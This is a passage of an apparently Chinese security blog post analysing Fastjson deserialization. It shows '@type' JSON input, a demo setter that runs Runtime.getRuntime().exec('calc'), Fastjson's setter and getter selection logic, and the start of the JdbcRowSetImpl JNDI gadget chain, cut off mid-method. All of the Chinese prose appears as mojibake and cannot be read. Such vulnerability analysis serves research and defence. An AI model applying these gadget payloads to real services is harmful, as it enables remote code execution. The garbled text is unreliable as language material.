        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> result <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> result2 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> <span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Label the class name</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨è¿™é‡Œ<code>toJSONString</code>æœ‰ä¸¤ç§å†™æ³•</p>
<ul>
<li><code>Json.toJSONString(obj)</code><ul>
<li>è½¬æ¢ä¸ºJSONæ ¼å¼</li>
</ul>
</li>
<li><code>Json.toJSONString(obj,SerializerFeature.WriteClassName)</code><ul>
<li>åœ¨è½¬æ¢çš„JSONæ ¼å¼ä¸­æŒ‡å®šè¯¥å¯¹è±¡å±äºä»€ä¹ˆç±»</li>
</ul>
</li>
</ul>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108105129564.png" alt="image-20220108105129564" loading="lazy"></p>
<p>å¯ä»¥å‘ç°<code>toJSONString</code>ä¼šcallåˆ°getæ–¹æ³•ï¼Œå…¶ä¸­ç¬¬äºŒç§<code>JSONString</code>ä¼šè¿”å›@typeï¼Œä»è€ŒæŒ‡æ˜objectæ‰€åœ¨ç±»ã€‚</p>
<h3 id="å°†jsonæ ¼å¼è½¬åŒ–ä¸ºå¯¹è±¡"><a href="#å°†jsonæ ¼å¼è½¬åŒ–ä¸ºå¯¹è±¡" class="headerlink" title="å°†jsonæ ¼å¼è½¬åŒ–ä¸ºå¯¹è±¡"></a>å°†jsonæ ¼å¼è½¬åŒ–ä¸ºå¯¹è±¡</h3><p>FastJsonæœ‰<strong>ä¸¤ç§</strong>è½¬æ¢jsonæ ¼å¼ä¸ºå¯¹è±¡çš„æ–¹æ³•</p>
<ul>
<li><code>JSON.parse(str)</code></li>
<li><code>JSON.parseObject(str)</code></li>
</ul>
<p>è¿™ä¸¤ä¸ªå…¶å®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯<code>parseObject()</code>è¦æ¯”<code>parse()</code>å¤šä¸€ä¸ª<code>toJson()</code>ï¼Œä¹Ÿå°±æ˜¯<code>parseObject()</code>è¿”å›çš„æ˜¯<code>JSONObject</code>ï¼Œè€Œ<code>parse()</code>è¿”å›çš„æ˜¯å…¶å®é™…çš„ç±»çš„å¯¹è±¡</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">JSONObject</span> <span class="token function">parseObject</span><span class="token punctuation">(</span><span class="token class-name">String</span> text<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token function">parse</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> obj <span class="token keyword">instanceof</span> <span class="token class-name">JSONObject</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token class-name">JSONObject</span><span class="token punctuation">)</span>obj <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token class-name">JSONObject</span><span class="token punctuation">)</span><span class="token function">toJSON</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>parseObject()åœ¨å®é™…è¿è¡Œçš„æ—¶å€™ä¼šè°ƒç”¨getå’Œsetæ–¹æ³•,å…¶ä¸­getæ–¹æ³•ä¼šåœ¨<code>toJSON()</code>ä¸­è¢«è°ƒç”¨</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108111958984.png" alt="image-20220108111958984" loading="lazy"></p>
<p>è€Œparse()åªä¼šè°ƒç”¨å¯¹è±¡çš„setæ–¹æ³•</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112115321.png" alt="image-20220108112115321" loading="lazy"></p>
<p>æ­¤å¤„æˆ‘ä»¬ä»¥<code>parse()</code>è¿›è¡Œæ¼”ç¤º</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/* Deserialization */</span>
<span class="token class-name">String</span> jsonString<span class="token operator">=</span><span class="token string">"&#123;\"name\":\"leihehe\"&#125;"</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span> obj2 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112140316.png" alt="image-20220108112140316" loading="lazy"></p>
<p><strong>set</strong>æ–¹æ³•å¹¶æœªè¢«è°ƒç”¨ï¼Œå› ä¸ºfastJSONå¹¶ä¸çŸ¥é“ä¼ è¿‡æ¥çš„jsonåº”è¯¥è¢«è½¬æ¢ä¸ºå“ªä¸€ä¸ªç±»çš„å¯¹è±¡ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŒ‡å®šå…¶<strong>type</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> jsonString <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"entity.User\",\"name\":\"leihehe\"&#125;"</span><span class="token punctuation">;</span>
<span class="token class-name">Object</span> obj2 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112247858.png" alt="image-20220108112247858" loading="lazy"></p>
<p>å¯è§è°ƒç”¨äº†constructorå’Œsetæ–¹æ³•ã€‚</p>
<p>é‚£ä¹ˆå¯ä»¥å°†æ¶æ„æ‰§è¡Œä»£ç æ”¾åœ¨<code>User#setName()</code>é‡Œï¼Œå°±èƒ½æ‰§è¡Œäº†</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"set name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112504772.png" alt="image-20220108112504772" loading="lazy"></p>
<h2 id="Setterå’ŒGetterè°ƒç”¨çš„æ·±å…¥æ¢ç©¶"><a href="#Setterå’ŒGetterè°ƒç”¨çš„æ·±å…¥æ¢ç©¶" class="headerlink" title="Setterå’ŒGetterè°ƒç”¨çš„æ·±å…¥æ¢ç©¶"></a>Setterå’ŒGetterè°ƒç”¨çš„æ·±å…¥æ¢ç©¶</h2><h3 id="JavaBeanInfo-build"><a href="#JavaBeanInfo-build" class="headerlink" title="JavaBeanInfo#build"></a>JavaBeanInfo#build</h3><p>Fastjsonæ˜¯å¦‚ä½•è°ƒç”¨å¯¹åº”çš„setterå’Œgetterçš„å‘¢ï¼Ÿ</p>
<p>å…³é”®ç‚¹åœ¨äºJavaBeanInfo#buildæ–¹æ³•ä¸­</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108204218773.png" alt="image-20220108204218773" loading="lazy"></p>
<p>å› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„@typeå¹¶ä¸æ»¡è¶³è¯¥æ¡ä»¶ï¼Œå› æ­¤ä¸ä¼šè¿›å…¥ifé‡Œçš„è¯­å¥ã€‚</p>
<h3 id="Setter"><a href="#Setter" class="headerlink" title="Setter"></a>Setter</h3><p>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œè¿™é‡Œçš„methodså®é™…æ˜¯ä¸Šé¢çš„</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–åˆ°çš„æ˜¯publicçš„methods</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108204615107.png" alt="image-20220108204615107" loading="lazy"></p>
<p>æ­¤å¤„éå†äº†æ‰€æœ‰çš„methodsï¼Œ<strong>å¹¶è¦æ±‚æ»¡è¶³ä»¥ä¸‹æ¡ä»¶</strong>ï¼š</p>
<blockquote>
<p><strong>method nameçš„é•¿åº¦å¤§äºç­‰äº4</strong></p>
<p><strong>methodåªèƒ½æœ‰ä¸€ç§parameter</strong></p>
<p><strong>methodå¹¶éstaticç±»å‹</strong></p>
<p><strong>methodçš„è¿”å›ç±»å‹å¿…é¡»ä¸ºvoidæˆ–è€…å½“å‰methodæ‰€åœ¨çš„classçš„ç±»å‹</strong></p>
</blockquote>
<p>è¿™æ ·æ‰èƒ½è¿›å…¥æ‰§è¡Œä¸‹é¢çš„è¯­å¥</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108205558062.png" alt="image-20220108205558062" loading="lazy"></p>
<p>æ ¹æ®ä¸åŒçš„æƒ…å†µï¼Œä¼šäº§ç”Ÿä¸åŒçš„propertyNameï¼Œç®€å•æ¥è¯´ï¼Œéƒ½æ˜¯ä¾ç…§javaå¸¸è§çš„ä¹¦å†™æ–¹æ³•çš„æ ¼å¼ã€‚</p>
<p>å¦‚æœä»¥ä¸Šæ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œåˆ™åœ¨methodçš„ç¬¬ä¸€ä¸ªå­—ç¬¦å˜ä¸ºå¤§å†™å¹¶åœ¨å‰é¢åŠ ä¸Šisä½œä¸ºfield</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108210443480.png" alt="image-20220108210443480" loading="lazy"></p>
<p>æœ€åç”¨addæ–¹æ³•ï¼Œå°†filedæ·»åŠ åˆ°filedInfoä¸­</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108210555536.png" alt="image-20220108210555536" loading="lazy"></p>
<h3 id="Getter"><a href="#Getter" class="headerlink" title="Getter"></a>Getter</h3><p>ç´§è·Ÿç€çš„ï¼Œæ˜¯Getterçš„è·å–</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> var29<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    method <span class="token operator">=</span> var30<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> methodName <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>methodName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">isStatic</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> methodName<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isUpperCase</span><span class="token punctuation">(</span>methodName<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> method<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token class-name">Collection</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">AtomicBoolean</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">==</span> method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">==</span> method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">AtomicLong</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">==</span> method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">JSONField</span> annotation <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">JSONField</span><span class="token punctuation">)</span>method<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">JSONField</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span>annotation<span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">String</span> propertyName<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> annotation<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                propertyName <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                propertyName <span class="token operator">=</span> <span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span>methodName<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> methodName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            fieldInfo <span class="token operator">=</span> <span class="token function">getField</span><span class="token punctuation">(</span>fieldList<span class="token punctuation">,</span> propertyName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>fieldInfo <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>propertyNamingStrategy <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    propertyName <span class="token operator">=</span> propertyNamingStrategy<span class="token punctuation">.</span><span class="token function">translate</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>

                <span class="token function">add</span><span class="token punctuation">(</span>fieldList<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">FieldInfo</span><span class="token punctuation">(</span>propertyName<span class="token punctuation">,</span> method<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Field</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> clazz<span class="token punctuation">,</span> type<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> annotation<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">JSONField</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯ä»¥çœ‹å‡ºè¢«è°ƒç”¨çš„getteréœ€è¦<strong>æ»¡è¶³ä»¥ä¸‹è¦æ±‚</strong>:</p>
<blockquote>
<p>Method name &gt;=4</p>
<p>methodä¸æ˜¯staticç±»å‹çš„</p>
<p>method nameå¿…é¡»ä»¥getå¼€å¤´</p>
<p>method nameçš„ç¬¬å››ä¸ªå­—ç¬¦å¿…é¡»æ˜¯å¤§å†™</p>
<p>methodæ˜¯æ— å‚çš„</p>
<p>methodçš„è¿”å›ç±»å‹æ˜¯Collectionã€Mapã€AtomicBooleanã€AtomicIntegerã€æˆ–AtomicLongä¸­çš„ä»»æ„ä¸€ä¸ª</p>
</blockquote>
<p>æœ€åä¼šè¢«æ·»åŠ åˆ°FieldInfoä¸­</p>
<p>Buildæ–¹æ³•çš„æœ€åä¼šè¿”å›ä¸€ä¸ª<code>JavaBeanInfo</code></p>
<p><code>return new JavaBeanInfo(clazz, builderClass, defaultConstructor, (Constructor)null, (Method)null, buildMethod, jsonType, fieldList);</code></p>
<h2 id="Fastjsonçš„ååºåˆ—åŒ–æµç¨‹"><a href="#Fastjsonçš„ååºåˆ—åŒ–æµç¨‹" class="headerlink" title="Fastjsonçš„ååºåˆ—åŒ–æµç¨‹"></a>Fastjsonçš„ååºåˆ—åŒ–æµç¨‹</h2><p>åœ¨<code>JSON.parse()</code>å¤„ä¸‹ä¸ªæ–­ç‚¹</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164249197.png" alt="image-20220108164249197" loading="lazy"></p>
<p>ä¸€ç›´å¾€ä¸‹èµ°ï¼Œå¯ä»¥çœ‹è§åˆ›å»ºäº†<code>DefaultJSONParser</code>å¯¹è±¡</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164603987.png" alt="image-20220108164603987" loading="lazy"></p>
<p>è·Ÿè¿›å»çœ‹æ˜¯å¦‚ä½•åˆ›å»ºçš„ï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164636943.png" alt="image-20220108164636943" loading="lazy"></p>
<p>è¿™é‡Œä¼šåˆ¤æ–­å¼€å¤´å­—ç¬¦æ˜¯å¦ä¸º<code>&#123;</code>ï¼Œå¦‚æœæ˜¯ï¼Œé‚£ä¹ˆèµ‹å€¼tokenä¸º12</p>
<p>æ¥ä¸‹æ¥å†è¿›å…¥parse()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164727601.png" alt="image-20220108164727601" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164746325.png" alt="image-20220108164746325" loading="lazy"></p>
<p>å› ä¸ºä¹‹å‰tokenè®¾ç½®ä¸º12ï¼Œæ‰€ä»¥è·³å…¥äº†case 12</p>
<p>åˆ›å»ºä¸€ä¸ªæ–°çš„<code>JSONObject</code>,å¹¶callåˆ°<code>parseObject()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164924577.png" alt="image-20220108164924577" loading="lazy"></p>
<p>ç»§ç»­å¾€ä¸‹èµ°ï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108172115011.png" alt="image-20220108172115011" loading="lazy"></p>
<p>åœ¨<code>TypeUtils#loadClass</code>ä¸­åˆ¤æ–­classNameï¼Œè¿™é‡Œéƒ½ä¸æ»¡è¶³ï¼Œå› æ­¤è·³è¿‡ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108173137665.png" alt="image-20220108173137665" loading="lazy"></p>
<p><code>mappings.put(className, clazz);</code>å°†classnameå’Œå¯¹åº”çš„classæ”¾å…¥mappingä¸­ï¼Œæœ€ååœ¨è¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108174017479.png" alt="image-20220108174017479" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108174039274.png" alt="image-20220108174039274" loading="lazy"></p>
<h2 id="JdbcRowSetImplåˆ©ç”¨é“¾"><a href="#JdbcRowSetImplåˆ©ç”¨é“¾" class="headerlink" title="JdbcRowSetImplåˆ©ç”¨é“¾"></a>JdbcRowSetImplåˆ©ç”¨é“¾</h2><h3 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h3><p><code>JdbcRowSetImpl</code>å¯ä»¥é…åˆJNDI+RMIæˆ–è€…JNDI+LDAPæ³¨å…¥ï¼Œå¦‚æœä¸çŸ¥é“<a href="https://leihehe.top/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3-9/">JNDIæ³¨å…¥çš„å¸ˆå‚…å¯ä»¥çœ‹è¿™é‡Œ</a></p>
<p>åœ¨JdbcRowSetImpl.classçš„connectæ–¹æ³•ä¸­ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">Connection</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>conn <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>conn<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDataSourceName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">InitialContext</span> var1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">DataSource</span> var2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">DataSource</span><span class="token punctuation">)</span>var1<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDataSourceName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„æ˜¯å…³é”®</span>
            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">?</span> var2<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> var2<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SQLException</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resBundle<span class="token punctuation">.</span><span class="token function">handleGetObject</span><span class="token punctuation">(</span><span class="token string">"jdbcrowsetimpl.connect"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
